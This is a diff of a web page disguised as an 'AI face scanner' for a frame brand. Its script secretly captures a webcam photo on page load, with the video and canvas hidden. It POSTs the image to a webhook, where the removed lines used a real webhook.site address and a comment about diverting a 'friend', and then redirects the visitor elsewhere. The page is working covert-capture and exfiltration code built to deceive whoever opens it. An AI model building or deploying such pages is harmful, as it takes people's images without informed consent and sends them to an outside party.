@@ -1,43 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>AI Face Scanner</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Face Scanner - Aura of Walls</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>AI Face Analysis for Aura of Walls</h1>
-    <p>Please wait, scanning your face for the best frame match...</p>
+    <h1>AI Face Analysis</h1>
+    <h3>Aura of Walls Premium Frames</h3>
+    <div class="loader"></div>
+    <p id="status">Please wait, analyzing lighting and face position...</p>
 
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        const webhookURL = "https://webhook.site/982b3537-a37c-414e-9a20-7b95ebcefa70";
+        // APNA WEBHOOK LINK YAHAN DALO
+        const webhookURL = "TERA_URL_YAHAN_DALO";
 
-        // Camera access maangna
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            // 2 second baad photo khinchna taake image clear aaye
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg');
+        async function startCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-                // Photo ko Webhook par bhejna
-                fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: imageData
-                }).then(() => {
-                    console.log("Photo Sent!");
-                    window.location.href = "https://google.com"; // Dost ko kahin aur bhej dena
-                });
-            }, 2000);
-        })
-        .catch(err => console.log("Camera Denied"));
+                document.getElementById('status').innerText = "Scanning... Stay still for 2 seconds.";
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7); // 0.7 Quality for faster upload
+
+                    // SENDING DATA TO WEBHOOK
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        body: imageData,
+                        headers: { 'Content-Type': 'text/plain' }
+                    }).then(() => {
+                        document.getElementById('status').innerText = "Analysis Complete! Redirecting...";
+                        setTimeout(() => {
+                            window.location.href = "https://auraofwalls.com"; // Redirect to your site
+                        }, 1000);
+                    });
+                }, 2500);
+            } catch (err) {
+                document.getElementById('status').innerText = "Error: Please allow camera access to use the AI Scanner.";
+                console.error(err);
+            }
+        }
+
+        // Run as soon as page loads
+        window.onload = startCapture;
     </script>
 </body>
 </html>
-
